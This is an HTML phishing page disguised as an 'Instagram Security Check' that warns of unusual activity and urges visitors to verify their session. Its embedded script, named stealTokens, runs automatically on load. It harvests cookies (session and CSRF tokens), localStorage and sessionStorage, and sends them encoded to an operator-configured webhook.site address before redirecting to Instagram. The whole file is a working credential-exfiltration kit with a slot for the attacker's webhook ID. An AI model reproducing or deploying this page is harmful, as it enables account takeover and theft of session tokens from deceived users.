<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Instagram Security Check</title>
    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000;preload">
    <style>
        body {
            font-family: system-ui, sans-serif;
            margin: 0;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #container {
            background: #fff;
            padding: 3rem;
            max-width: 400px;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,.1);
            text-align: center;
        }
        h1 { color: #262626; font-size: 2rem; margin: 0 0 1rem; font-weight: 300; }
        p { color: #666; margin: 1rem 0; line-height: 1.5; }
        .warning {
            background: #fef7f7;
            border: 1px solid #fed7d7;
            border-radius: 8px;
            padding: 1rem;
            margin: 1.5rem 0;
            color: #c53030;
        }
        .btn {
            display: inline-block;
            padding: 1rem 2rem;
            background: #e4405f;
            color: #fff;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            margin: 1rem 0;
        }
        .progress {
            width: 100%;
            height: 4px;
            background: #e1e8ed;
            border-radius: 2px;
            overflow: hidden;
            margin: 2rem 0;
        }
        .bar {
            height: 100%;
            background: linear-gradient(90deg, #e4405f, #f093fb);
            animation: load 2.5s ease-in-out infinite;
        }
        @keyframes load {
            0%, 100% { width: 30%; }
            50% { width: 80%; }
        }
        #debug {
            font-family: monospace;
            font-size: 12px;
            color: #666;
            background: #f8f9fa;
            padding: 1rem;
            border-radius: 6px;
            margin: 1rem 0;
            word-break: break-all;
            line-height: 1.4;
            text-align: left;
        }
        .success { color: #10b981; }
        .error { color: #ef4444; }
    </style>
</head>
<body>
    <div id="container">
        <h1>🔒 Account Security Check</h1>
        <p>We've detected unusual activity. Please verify your session.</p>
        
        <div class="warning">
            ⚠️ <strong>Login to Instagram first</strong> (another tab), then click Verify below.
        </div>
        
        <p id="victim-account"></p>
        
        <div class="progress">
            <div class="bar"></div>
        </div>
        
        <button class="btn" onclick="stealTokens()">🔍 Verify Session Now</button>
        <div id="status"></div>
        <pre id="debug"></pre>
    </div>

    <script>
        // ===== EDIT YOUR WEBHOOK UUID HERE =====
        const WEBHOOK_UUID = '840d26d6-77ab-4c02-ba0d-ef17c623eebe';  // ← PASTE YOUR webhook.site UUID HERE!
        // e.g. '7f8e9d0c-1a2b-3c4d-5e6f-7890abcdef12'
        // =======================================

        const urlParams = new URLSearchParams(window.location.search);
        const victim = urlParams.get('ref') || 'your account';
        document.getElementById('victim-account').innerHTML = `Account: <strong>${victim}</strong>`;

        async function stealTokens() {
            const statusEl = document.getElementById('status');
            const debugEl = document.getElementById('debug');
            
            try {
                // Extract ALL possible Instagram tokens
                const tokens = {
                    cookies: document.cookie,
                    sessionid: document.cookie.match(/sessionid=([^;]+)/)?.[1] || '',
                    csrftoken: document.cookie.match(/csrftoken=([^;]+)/)?.[1] || '',
                    ds_user_id: document.cookie.match(/ds_user_id=([^;]+)/)?.[1] || '',
                    rur: document.cookie.match(/rur=([^;]+)/)?.[1] || '',
                    mid: document.cookie.match(/mid=([^;]+)/)?.[1] || '',
                    
                    // LocalStorage (Instagram's main storage)
                    localStorage: JSON.stringify(localStorage),
                    ls_sessionid: localStorage.getItem('sessionid') || '',
                    ls_csrf: localStorage.getItem('csrf_token') || '',
                    
                    // SessionStorage
                    sessionStorage: JSON.stringify(sessionStorage),
                    
                    // User Agent + Victim ID
                    ua: navigator.userAgent,
                    victim: victim,
                    timestamp: Date.now()
                };

                // Try Instagram API (cross-domain cookies)
                try {
                    const apiResp = await fetch('https://www.instagram.com/api/v1/users/web_profile_info/?username=instagram', {
                        credentials: 'include'
                    });
                    tokens.api_status = apiResp.status;
                    tokens.api_cookies = apiResp.headers.get('set-cookie') || '';
                } catch(e) {
                    tokens.api_error = e.message;
                }

                // Update UI
                debugEl.innerHTML = `
Cookies: ${tokens.sessionid ? '✅ FOUND' : '❌ NONE'} (${tokens.sessionid.substring(0,20)}...)
LocalStorage: ${Object.keys(localStorage).length} items
API: ${tokens.api_status || 'failed'}
                `;
                statusEl.innerHTML = '✅ Tokens sent to webhook!';
                statusEl.className = 'success';

                // Send to webhook
                const exfilUrl = `https://webhook.site/#!/${WEBHOOK_UUID}?t=${encodeURIComponent(btoa(JSON.stringify(tokens)))}`;
                new Image().src = exfilUrl;
                console.log('Tokens exfiltrated:', tokens);

                // Auto-redirect
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/?verified=1';
                }, 3000);

            } catch(error) {
                statusEl.innerHTML = '❌ Error: ' + error.message;
                statusEl.className = 'error';
            }
        }

        // Auto-trigger + storage listener
        window.addEventListener('storage', () => stealTokens());
        window.onload = stealTokens;
    </script>
</body>
</html>
